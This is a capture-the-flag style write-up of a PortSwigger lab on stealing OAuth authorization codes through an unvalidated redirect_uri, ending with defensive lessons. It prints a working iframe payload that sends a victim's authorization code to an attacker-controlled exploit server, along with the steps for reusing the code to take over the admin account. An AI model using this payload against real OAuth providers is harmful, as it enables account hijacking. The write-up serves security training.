# OAuth Lab 4 — OAuth account hijacking via redirect_uri — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** OAuth 2.0 authentication
**Lab:** OAuth account hijacking via redirect_uri
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~04:53 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Authorization code theft via unvalidated `redirect_uri` — the OAuth provider accepts any `redirect_uri` in the authorization request instead of checking it against the client's registered whitelist, so an authorization code issued for a victim can be sent to an attacker-controlled domain.

## Solution

1. Completed a normal social login as `wiener:peter` via `/my-account` (authorization code flow). The provider session stayed active afterwards, so later `/auth` requests redirect immediately without another login.
2. Proved the leak with the attacker's own session — an `/auth` request with `redirect_uri` pointed at the lab's exploit server:
   ```
   GET https://oauth-<id>.oauth-server.net/auth?client_id=<id>&redirect_uri=https://<exploit-server>/&response_type=code&scope=openid%20profile%20email
   → 302 https://<exploit-server>/?code=<own-code>
   ```
3. Stored this exploit on the lab's own exploit server and delivered it to the victim (the admin, who has an active OAuth session):
   ```html
   <iframe src="https://oauth-<id>.oauth-server.net/auth?client_id=<id>&redirect_uri=https://<exploit-server>/victim&response_type=code&scope=openid%20profile%20email"></iframe>
   ```
   (The `/victim` path keeps the victim's code distinct from the test code in the access log.)
4. The victim's browser loaded the iframe; the provider redirected it to `https://<exploit-server>/victim?code=<victim-code>`, which appeared in the exploit server's access log.
5. Used the stolen code in a fresh session — the lab exchanges it at the token endpoint and logs the holder in as the code's owner:
   ```
   GET https://<lab>/oauth-callback?code=<victim-code>
   ```
   Logged in as `administrator@normal-user.net`.
6. Deleted carlos: `GET /admin/delete?username=carlos` — home page then showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the authorization code is the only thing standing between the attacker and the victim's account, and the provider sends it to whatever `redirect_uri` the authorization request names. With no whitelist check, the attacker names their own server and the victim's browser delivers the code there.
- **Why the victim needs an active provider session:** the iframe fires the `/auth` request in the victim's browser; because the victim is already logged in at the provider, no login prompt appears and the code is issued silently.
- **The key detail:** codes are short-lived, so the theft and the reuse must happen promptly — read the access log and use the code immediately after delivery.

## Lessons Learned

- Always validate `redirect_uri` against an exact registered whitelist (exact string match, not prefix/substring) — never accept an arbitrary value.
- Authorization codes must be bound to the client and `redirect_uri` they were issued for, and exchanged only once.
- An open redirect or unvalidated redirect parameter in an OAuth flow is an account-takeover vector, not a minor misconfiguration.
